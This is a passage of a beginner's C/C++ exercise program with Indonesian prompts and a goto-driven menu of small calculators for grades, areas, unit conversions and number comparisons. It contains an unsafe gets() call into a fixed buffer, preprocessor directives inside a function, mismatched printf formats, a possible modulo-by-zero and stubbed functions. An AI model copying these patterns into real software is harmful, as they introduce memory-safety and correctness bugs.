	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_luas_segitiga;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_luas_segitiga;}return 0;
}
int hitung_nilai_akhir_mahasiswa()
{
	//Default
	/*
	#include<stdio.h>
	#include<conio.h>

	main()
	{
	 clrscr();
	 char nm [20],hm;float nq,nt,nuts,nuas,na;
	 printf("Nama Mahasiswa	: ");gets(nm);
	 printf("Nilai Quiz	: ");scanf("%f",&nq);
	 printf("Nilai Tugas	: ");scanf("%f",&nt);
	 printf("Nilai UTS	: ");scanf("%f",&nuts);
	 printf("Nilai UTS	: ");scanf("%f",&nuas);
	 na=0.1*nq+0.2*nt+0.3*nuts+0.4*nuas;
	 if(na>=80 && na<=100)hm='A';
	 else if(na>=66 && na<79)hm='B';
	 else if(na>=46 && na<66)hm='C';
	 else if(na>=31 && na<46)hm='D';
	 else hm='E';
	 printf("Nilai Akhirnya = %.2f\n",na);
	 printf("Huruf Mutunya  = %c",hm);getch();
	}
	*/
	hitung_nilai_akhir_mahasiswa:system("cls");string pilihan;
	system("cls");
	char nm [20],hm;float nq,nt,nuts,nuas,na;
	printf("Nama Mahasiswa	: ");gets(nm);
	printf("Nilai Quiz	: ");scanf("%f",&nq);
	printf("Nilai Tugas	: ");scanf("%f",&nt);
	printf("Nilai UTS	: ");scanf("%f",&nuts);
	printf("Nilai UTS	: ");scanf("%f",&nuas);
	na=0.1*nq+0.2*nt+0.3*nuts+0.4*nuas;
	if(na>=80 && na<=100)hm='A';
	else if(na>=66 && na<79)hm='B';
	else if(na>=46 && na<66)hm='C';
	else if(na>=31 && na<46)hm='D';
	else hm='E';
	printf("Nilai Akhirnya = %.2f\n",na);
	printf("Huruf Mutunya  = %c",hm);getch();
	cout << endl;
	cout << endl;choosing_in_hitung_nilai_akhir_mahasiswa:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_nilai_akhir_mahasiswa;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_nilai_akhir_mahasiswa;}return 0;
}
int hitung_nilai_rata_rata_item()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int b1,j1,b2,j2; float js,rata_rata;
	 clrscr();
	 printf("***MENGHITUNG NILAI RATA-RATA ITEM***\n");
	 printf("Masukkan berat item 1 = "); scanf("%d",&b1);
	 printf("Masukkan jumlah butir item 1 = "); scanf("%d",&j1);
	 printf("Masukkan berat item 2 = "); scanf("%d",&b2);
	 printf("Masukkan jumlah butir item 2 = "); scanf("%d",&j2);

	 js=(b1*j1)+(b2*j2);
	 rata_rata=(float)js/(j1+j2);

	 printf("Nilai Rata-rata = %f",rata_rata);
	 getch();
	}
	*/
	hitung_nilai_rata_rata_item:system("cls");string pilihan;
	int b1,j1,b2,j2; float js,rata_rata;
	system("cls");
	printf("***MENGHITUNG NILAI RATA-RATA ITEM***\n");
	printf("Masukkan berat item 1 = "); scanf("%d",&b1);
	printf("Masukkan jumlah butir item 1 = "); scanf("%d",&j1);
	printf("Masukkan berat item 2 = "); scanf("%d",&b2);
	printf("Masukkan jumlah butir item 2 = "); scanf("%d",&j2);

	js=(b1*j1)+(b2*j2);
	rata_rata=(float)js/(j1+j2);

	printf("Nilai Rata-rata = %f",rata_rata);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_nilai_rata_rata_item:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_nilai_rata_rata_item;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_nilai_rata_rata_item;}return 0;
}
int hitung_perimeter_dan_luas_persegi_panjang()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int p,l,kl,luas;
	 clrscr();
	 printf("Masukkan panjang persegi = "); scanf("%d",&p);
	 printf("Masukkan lebar persegi   = "); scanf ("%d",&l);
	 kl= 2*(p+l);
	 luas= p*l;
	 printf("Perimeter persegi panjang = %d inchi\n",kl);
	 printf("Luas persegi panjang      = %d inchi",luas);
	 getch();
	}
	*/
	hitung_perimeter_dan_luas_persegi_panjang:system("cls");string pilihan;
	int p,l,kl,luas;
	system("cls");
	printf("Masukkan panjang persegi = "); scanf("%d",&p);
	printf("Masukkan lebar persegi   = "); scanf ("%d",&l);
	kl= 2*(p+l);
	luas= p*l;
	printf("Perimeter persegi panjang = %d inchi\n",kl);
	printf("Luas persegi panjang      = %d inchi",luas);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_perimeter_dan_luas_persegi_panjang:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_perimeter_dan_luas_persegi_panjang;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_perimeter_dan_luas_persegi_panjang;}return 0;
}
int hitung_total_biaya_dari_perhitungan_jarak_dan_bensin()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	#define sl 18
	#define h 6700
	main()
	{ int jr; float liter,t_biaya;
	 clrscr();
	 printf("Jarak Bandung Ke Jakarta = "); scanf("%d",&jr);

	 liter=(float)jr/sl;
	 t_biaya=liter*h;

	 printf("Bensin yang dihabiskan   = %.2f Liter\n ",liter);
	 printf("Total biaya yang dibutuhkan = Rp. %.2f",t_biaya);
	 getch();
	}
	*/
	#include <stdio.h>
	#include <conio.h>
	#define sl 18
	#define h 6700
	
	hitung_total_biaya_dari_perhitungan_jarak_dan_bensin:system("cls");string pilihan;
	int jr; float liter,t_biaya;
	system("cls");
	printf("Jarak Bandung Ke Jakarta = "); scanf("%d",&jr);

	liter=(float)jr/sl;
	t_biaya=liter*h;

	printf("Bensin yang dihabiskan   = %.2f Liter\n ",liter);
	printf("Total biaya yang dibutuhkan = Rp. %.2f",t_biaya);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_total_biaya_dari_perhitungan_jarak_dan_bensin:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_total_biaya_dari_perhitungan_jarak_dan_bensin;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_total_biaya_dari_perhitungan_jarak_dan_bensin;}return 0;
}
int hitung_volume_balok()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{     float pb,lb,tb,vol_balok;
		clrscr();
		puts("**********************************");
		puts("*** MENGHITUNG VOLUME BALOK    ***");
		puts("***created by : Enjank Rohiman ***");
		puts("**********************************");
		printf("\n\n");
		printf("PANJANG BALOK = "); scanf("%f",&pb);
		printf("LEBAR BALOK   = "); scanf("%f",&lb);
		printf("TINGGI BALOK  = "); scanf("%f",&tb);
		
		vol_balok=pb*lb*tb;
		printf("\n\n");
		
		printf("VOLUME BALOK ADALAH %.2f",vol_balok);
		getch();
	}

	*/
	hitung_volume_balok:system("cls");string pilihan;
	float pb,lb,tb,vol_balok;
	system("cls");
	puts("**********************************");
	puts("*** MENGHITUNG VOLUME BALOK    ***");
	puts("***created by : Enjank Rohiman ***");
	puts("**********************************");
	printf("\n\n");
	printf("PANJANG BALOK = "); scanf("%f",&pb);
	printf("LEBAR BALOK   = "); scanf("%f",&lb);
	printf("TINGGI BALOK  = "); scanf("%f",&tb);
	
	vol_balok=pb*lb*tb;
	printf("\n\n");
	
	printf("VOLUME BALOK ADALAH %.2f",vol_balok);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_volume_balok:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_volume_balok;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_volume_balok;}return 0;
}
int kalkulator_sederhana()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{ int a,b;
	 printf("MASUKAN ANGKA 1 =  "); scanf("%d",&a);
	 printf("MASUKAN ANGKA 2 =  "); scanf("%d",&b);

	 printf("%d + %d = %d\n",a,b,a+b);
	 printf("%d - %d = %d\n",a,b,a-b);
	 printf("%d x %d = %d\n",a,b,a*b);
	 printf("%d : %d = %d\n",a,b,(float)a/b);
	 printf("%d mod %d = %d\n",a,b,a%b);
	 printf("%d div %d  = %d\n",a,b,a/b);


	 getch();
	}
	*/
	kalkulator_sederhana:system("cls");string pilihan;
	int a,b;
	printf("MASUKAN ANGKA 1 =  "); scanf("%d",&a);
	printf("MASUKAN ANGKA 2 =  "); scanf("%d",&b);
	printf("%d + %d = %d\n",a,b,a+b);
	printf("%d - %d = %d\n",a,b,a-b);
	printf("%d x %d = %d\n",a,b,a*b);
	printf("%d : %d = %d\n",a,b,(float)a/b);
	printf("%d mod %d = %d\n",a,b,a%b);
	printf("%d div %d  = %d\n",a,b,a/b);
	getch();
	cout << endl;
	cout << endl;choosing_in_kalkulator_sederhana:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto kalkulator_sederhana;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_kalkulator_sederhana;}return 0;
}
int konversi_angka_ribuan_menjadi_4_pecahan_bilangan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int a,rb,rt,pul,sat;
	 clrscr();
	 printf("Masukkan Angka dalam RIBUAN = "); scanf("%d",&a);

	 rb= a/1000;
	 rt= (a-rb*1000)/100;
	 pul= (a-rb*1000-rt*100)/10;
	 sat = (a-rb*1000-rt*100-pul*10);

	 printf("%d RIBUAN %d RATUSAN %d PULUHAN %d SATUAN",rb,rt,pul,sat);
	 getch();
	}
	*/
	konversi_angka_ribuan_menjadi_4_pecahan_bilangan:system("cls");string pilihan;
	int a,rb,rt,pul,sat;
	system("cls");
	printf("Masukkan Angka dalam RIBUAN = "); scanf("%d",&a);

	rb= a/1000;
	rt= (a-rb*1000)/100;
	pul= (a-rb*1000-rt*100)/10;
	sat = (a-rb*1000-rt*100-pul*10);

	printf("%d RIBUAN %d RATUSAN %d PULUHAN %d SATUAN",rb,rt,pul,sat);
	getch();
	cout << endl;
	cout << endl;choosing_in_konversi_angka_ribuan_menjadi_4_pecahan_bilangan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto konversi_angka_ribuan_menjadi_4_pecahan_bilangan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_konversi_angka_ribuan_menjadi_4_pecahan_bilangan;}return 0;
}
int konversi_hari_ke_tahun_minggu_dan_hari()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int hari,t,m,h;
	 clrscr();
	 printf("Masukkan Banyak Hari = "); scanf("%d",&hari);

	 t= hari/365;
	 m= (hari % 365) / 7;
	 h= (hari % 365) % 7;
	 
	printf("Tahun 	: %d\n",t);
	printf("Minggu	: %d\n",m);
	printf("Hari 	: %d\n",h);
	getch();
	}
	*/
	konversi_hari_ke_tahun_minggu_dan_hari:system("cls");string pilihan;
	/*
	konversi_hari_ke_tahun_minggu_dan_hari:system("cls");string pilihan;
	int hari,t,m,h;
	system("cls");
	printf("Masukkan Banyak Hari = "); scanf("%d",&hari);

	t= hari/365;
	m= (hari % 365) / 7;
	h= (hari % 365) % 7;
 
	printf("Tahun 	: %d\n",t);
	printf("Minggu	: %d\n",m);
	printf("Hari 	: %d\n",h);
	getch();
	*/
	cout << "REPAIR SOON" << endl;
	cout << endl;
	cout << endl;choosing_in_konversi_hari_ke_tahun_minggu_dan_hari:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto konversi_hari_ke_tahun_minggu_dan_hari;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_konversi_hari_ke_tahun_minggu_dan_hari;}return 0;
}
int konversi_menit_ke_hitungan_jam_dan_menit()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int m,jam,menit;
	 clrscr();
	 printf("Masukkan menit : "); scanf("%d",&m);

	 jam= (float)m / 60;
	 menit= m % jam;

	 printf(" %d Jam %d menit",jam,menit);

	 getch();
	}
	*/
	konversi_menit_ke_hitungan_jam_dan_menit:system("cls");string pilihan;
	int m,jam,menit;
	system("cls");
	printf("Masukkan menit : "); scanf("%d",&m);

	jam= (float)m / 60;
	menit= m % jam;

	printf(" %d Jam %d menit",jam,menit);

	getch();
	cout << endl;
	cout << endl;choosing_in_konversi_menit_ke_hitungan_jam_dan_menit:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto konversi_menit_ke_hitungan_jam_dan_menit;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_konversi_menit_ke_hitungan_jam_dan_menit;}return 0;
}
int konversi_suhu()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int cel; float rea,fah,kel;
	 clrscr();
	 printf("Konversi Suhu\n\n");
	 printf("Input SUhu Dalam Derajat Celcius ="); scanf("%d",&cel);
	 rea=(float) 4/5*cel; fah=(float) 9/5*cel+32; kel=273+cel;
	 printf("Hasil Konversinya adalah =\n");
	 printf("%.2fReamur\n%.2fFahrenheit\n%.2fKelvin\n",rea,fah,kel);
	 getch();
	}
	*/
	konversi_suhu:system("cls");string pilihan;
	int cel; float rea,fah,kel;
	system("cls");
	printf("Konversi Suhu\n\n");
	printf("Input SUhu Dalam Derajat Celcius ="); scanf("%d",&cel);
	rea=(float) 4/5*cel; fah=(float) 9/5*cel+32; kel=273+cel;
	printf("Hasil Konversinya adalah =\n");
	printf("%.2fReamur\n%.2fFahrenheit\n%.2fKelvin\n",rea,fah,kel);
	getch();
	cout << endl;
	cout << endl;choosing_in_konversi_suhu:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto konversi_suhu;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_konversi_suhu;}return 0;
}
int mencari_bilangan_terbesar_dari_2_bilangan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int a,b,max;

	 clrscr();
	 printf("Masukan Bilangan Pertama = "); scanf ("%d",&a);
	 printf("Masukan Bilangan Kedua   = "); scanf ("%d",&b);
	 if(a>b){max=a;}
	 else{max=b;}
	 printf("Bilangan Terbesar adalah %d",max);
	 getch();
	}
	*/
	mencari_bilangan_terbesar_dari_2_bilangan:system("cls");string pilihan;
	int a,b,max;
	system("cls");
	printf("Masukan Bilangan Pertama = "); scanf ("%d",&a);
	printf("Masukan Bilangan Kedua   = "); scanf ("%d",&b);
	if(a>b){max=a;}
	else{max=b;}
	printf("Bilangan Terbesar adalah %d",max);
	getch();
	cout << endl;
	cout << endl;choosing_in_mencari_bilangan_terbesar_dari_2_bilangan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto mencari_bilangan_terbesar_dari_2_bilangan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_mencari_bilangan_terbesar_dari_2_bilangan;}return 0;
}
int mencari_bilangan_terbesar_dari_3_bilangan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{
	 clrscr();
	 int bil1,bil2,bil3,max;
	 printf("Masukkan 3 Bilangan : ");scanf("%d %d %d",&bil1,&bil2,&bil3);
	 if(bil1>bil2&&bil1>bil3){max=bil1;}
	 else if(bil2>bil1&&bil2>bil3){max=bil2;}
	 else{max=bil3;}
	 printf("Bilangan terbesar adalah %d",max);
	 getch();
	}
	*/
	mencari_bilangan_terbesar_dari_3_bilangan:system("cls");string pilihan;
	system("cls");
	int bil1,bil2,bil3,max;
	printf("Masukkan 3 Bilangan : ");scanf("%d %d %d",&bil1,&bil2,&bil3);
	if(bil1>bil2&&bil1>bil3){max=bil1;}
	else if(bil2>bil1&&bil2>bil3){max=bil2;}
	else{max=bil3;}
	printf("Bilangan terbesar adalah %d",max);
	getch();
	cout << endl;
	cout << endl;choosing_in_mencari_bilangan_terbesar_dari_3_bilangan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto mencari_bilangan_terbesar_dari_3_bilangan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_mencari_bilangan_terbesar_dari_3_bilangan;}return 0;
}
int menentukan_bilangan_ganjil_atau_genap()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	 
	int main()
	{
	clrscr();
			int angka;
		printf("Masukan Angka : ");scanf("%d",&angka);
			if(angka%2==0){printf("%d adalah bilangan genap \n",angka);} 
		else{printf("%d adalah bilangan ganjil \n",angka);}
			getch();
	}
	*/
	menentukan_bilangan_ganjil_atau_genap:system("cls");string pilihan;
	system("cls");
	int angka;
	printf("Masukan Angka : ");scanf("%d",&angka);
	if(angka%2==0){printf("%d adalah bilangan genap \n",angka);} 
	else{printf("%d adalah bilangan ganjil \n",angka);}
	getch();
	cout << endl;
	cout << endl;choosing_in_menentukan_bilangan_ganjil_atau_genap:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto menentukan_bilangan_ganjil_atau_genap;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_menentukan_bilangan_ganjil_atau_genap;}return 0;
}
int menentukan_bilangan_positif_atau_negatif()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
	 clrscr();
	 int angka;
	 printf("Masukkan bilangan : ");scanf("%d",&angka);
	 if(angka>=0){printf("%d adalah angka positif\n",angka);}
	 else{printf("%d adalah angka negatif\n",angka);}
	 getch();
	}
	*/
	menentukan_bilangan_positif_atau_negatif:system("cls");string pilihan;
	system("cls");
	int angka;
	printf("Masukkan bilangan : ");scanf("%d",&angka);
	if(angka>=0){printf("%d adalah angka positif\n",angka);}
	else{printf("%d adalah angka negatif\n",angka);}
	getch();
	cout << endl;
	cout << endl;choosing_in_menentukan_bilangan_positif_atau_negatif:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto menentukan_bilangan_positif_atau_negatif;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_menentukan_bilangan_positif_atau_negatif;}return 0;
}
int menentukan_kategori_tinggi_badan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{
		clrscr();
		int tb;
		printf("Tinggi Badan : ");scanf("%d",&tb);
		if(tb>=0 && tb<=100){printf("Kategori Tinggi saudara adalah Pendek \n");}
		else if(tb>=101 && tb<150){printf("Kategori Tinggi saudara adalah Sedang \n");}
		else if(tb>=151 && tb>151){printf("Kategori Tinggi saudara adalah Tinggi \n");}
		getch();
	}
	*/
	menentukan_kategori_tinggi_badan:system("cls");string pilihan;
	system("cls");
	int tb;
	printf("Tinggi Badan : ");scanf("%d",&tb);
	if(tb>=0 && tb<=100){printf("Kategori Tinggi saudara adalah Pendek \n");}
	else if(tb>=101 && tb<150){printf("Kategori Tinggi saudara adalah Sedang \n");}
	else if(tb>=151 && tb>151){printf("Kategori Tinggi saudara adalah Tinggi \n");}
	getch();
	cout << endl;
	cout << endl;choosing_in_menentukan_kategori_tinggi_badan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto menentukan_kategori_tinggi_badan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_menentukan_kategori_tinggi_badan;}return 0;
}
int menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{
	 clrscr();
	 int n1,n2;
	 printf("Masukkan 2 buah Bilangan Bulat : ");scanf("%d %d",&n1,&n2);
	 if(n1==n2){printf("Nomor 1 dan Nomor 2 sama");}
	 else printf("Nomor 1 dan Nomor 2 berbeda");
	 getch();
	}
	*/
	menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat:system("cls");string pilihan;
	cout << endl;
	cout << endl;choosing_in_menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat;}return 0;
}
int pembagian_dengan_pengurangan_berulang()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
	 clrscr();
	 int bil1,bil2;
	 printf("Pembagian menggunakan Pengurangan Berulang\n");
	 do
	 {
		printf("Masukkan Bilangan bulat pertama : ");
		scanf("%d",&bil1);
		printf("Masukkan Bilangan bulat kedua : ");
		scanf("%d",&bil2);
	 }while(bil1%bil2!=0);
	 int remainder=bil1;
	 int subtractionCount=0;
	 while(remainder>0)
	 {
		printf("%d - %d = %d \n", remainder,bil2,(remainder-bil2));
		remainder-=bil2;
		subtractionCount++;
	 }
	 printf("\n\n%d / %d = %d\n",bil1,bil2,subtractionCount);
	 getch();
	}
	*/
	pembagian_dengan_pengurangan_berulang:system("cls");string pilihan;
	system("cls");
	int bil1,bil2;
	printf("Pembagian menggunakan Pengurangan Berulang\n");
	do
	{
		printf("Masukkan Bilangan bulat pertama : ");
		scanf("%d",&bil1);
		printf("Masukkan Bilangan bulat kedua : ");
		scanf("%d",&bil2);
	}while(bil1%bil2!=0);
	int remainder=bil1;
	int subtractionCount=0;
	while(remainder>0)
	{
		printf("%d - %d = %d \n", remainder,bil2,(remainder-bil2));
		remainder-=bil2;
		subtractionCount++;
	}
	printf("\n\n%d / %d = %d\n",bil1,bil2,subtractionCount);
	getch();
	cout << endl;
	cout << endl;choosing_in_pembagian_dengan_pengurangan_berulang:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto pembagian_dengan_pengurangan_berulang;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_pembagian_dengan_pengurangan_berulang;}return 0;
}
int penempatan_string_menggunakan_perintah_puts_dan_gotoxy()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{
		clrscr();
		gotoxy(20,5); puts("***** *  * **** **** ****	   ****");
		gotoxy(20,6); puts("  *   *  * *  * *  * *  *	   *   ");
		gotoxy(20,7); puts("  *   *  * **** **** *  *  **  *   ");
		gotoxy(20,8); puts("  *   *  * * *  *  * *  *      *   ");
		gotoxy(20,9); puts("  *   **** *  * **** ****      ****");
		
		getch();
	}
	*/
	penempatan_string_menggunakan_perintah_puts_dan_gotoxy:system("cls");string pilihan;
	system("cls");
	gotoxy(20,5); puts("***** *  * **** **** ****	   ****");
	gotoxy(20,6); puts("  *   *  * *  * *  * *  *	   *   ");
	gotoxy(20,7); puts("  *   *  * **** **** *  *  **  *   ");
	gotoxy(20,8); puts("  *   *  * * *  *  * *  *      *   ");
	gotoxy(20,9); puts("  *   **** *  * **** ****      ****");
	getch();
	cout << endl;
	cout << endl;choosing_in_penempatan_string_menggunakan_perintah_puts_dan_gotoxy:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto penempatan_string_menggunakan_perintah_puts_dan_gotoxy;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_penempatan_string_menggunakan_perintah_puts_dan_gotoxy;}return 0;
}
int perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{    int b1,b2,i;
	clrscr();
	do{
	   puts("BILANGAN HARUS BILANGAN BULAT POSITIF >0");
	   printf("Masukkan Bilangan Bulat Ke-1 = "); scanf("%d",&b1);
	   printf("Masukkan Bilangan Bulat Ke-2 = "); scanf("%d",&b2);

	   if(b1>=0 && b2>=0){
	   puts("--------------------------------");
	   printf("Bilangan Bulat Ke-1 = %d\n",b1);
	   printf("Bilangan Bulat Ke-2 = %d ",b2);
	   printf("\nMaka %d x %d = %d ",b1,b2,b1*b2);
	   printf("\n%d Maka didapatkan dengan cara : ",b1*b2);
	   for(i=1;i<=b2;i++){
	   printf("%d ",b1);
	   if (i < b2){
	   printf("+ ");
	   }
	  }
	  printf("\n");
	  }else if (b1<0 || b2<0){
	  puts("Baca Ketentuan Diatas...!!!");

	  }
	}while (b1<=0 || b2<=0);

	getch();
	}
	*/
	perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan:system("cls");string pilihan;
	int b1,b2,i;
	system("cls");
	do{
	   puts("BILANGAN HARUS BILANGAN BULAT POSITIF >0");
	   printf("Masukkan Bilangan Bulat Ke-1 = "); scanf("%d",&b1);
	   printf("Masukkan Bilangan Bulat Ke-2 = "); scanf("%d",&b2);

	   if(b1>=0 && b2>=0){
	   puts("--------------------------------");
	   printf("Bilangan Bulat Ke-1 = %d\n",b1);
	   printf("Bilangan Bulat Ke-2 = %d ",b2);
	   printf("\nMaka %d x %d = %d ",b1,b2,b1*b2);
	   printf("\n%d Maka didapatkan dengan cara : ",b1*b2);
	   for(i=1;i<=b2;i++){
	   printf("%d ",b1);
	   if (i < b2){
	   printf("+ ");
	   }
	  }
	  printf("\n");
	  }else if (b1<0 || b2<0){
	  puts("Baca Ketentuan Diatas...!!!");

	  }
	}while (b1<=0 || b2<=0);

	getch();
	cout << endl;
	cout << endl;choosing_in_perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan;}return 0;
}
int program_combine_3_kasus()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	#include <ctype.h>
	main()
	{
		int i,jgn=0,jgl=0,a,b,bjb,bil,jb,kend,lp,bayar;
		char pilih,jawab;
		do
		{
			clrscr();
			puts("Jawaban QUIZ");
			puts("1.Jawaban no.1");
			puts("2.Jawaban no.2");
			puts("3.Jawaban no.3");
			printf("Pilih 1/2/3 = ");pilih=getche();printf("\n");
			switch(pilih)
			{
				case '1' :	printf("Masukkan 2 Buah Bilangan = ");
							scanf("%d %d",&a,&b);
							printf("Hasilnya adalah %d %d %d %.2f",a+b,a-b,a*b,(float)a/b);
							break;
				case '2' :  printf("Jenis kendaraan 1.motor 2.mobil = ");
